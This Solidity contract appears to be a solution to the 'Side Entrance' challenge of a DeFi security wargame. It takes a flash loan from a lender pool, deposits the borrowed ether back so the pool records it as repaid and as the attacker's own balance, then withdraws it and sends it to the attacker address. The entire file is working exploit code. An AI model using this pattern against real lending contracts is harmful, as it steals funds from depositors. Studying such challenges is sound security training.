// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./SideEntranceLenderPool.sol";

contract SideEntranceAttacker {

    SideEntranceLenderPool private immutable pool;
    address payable attacker;

    constructor (address poolAddress, address attackerAddress) {
        pool = SideEntranceLenderPool(poolAddress);
        attacker = payable(attackerAddress);
    }

    function attack(uint256 amount) external {
        pool.flashLoan(amount);
        pool.withdraw();
    }

    function execute() external payable{
        pool.deposit{value: msg.value}();
    }

    receive () external payable {
        attacker.transfer(msg.value);
    }
}

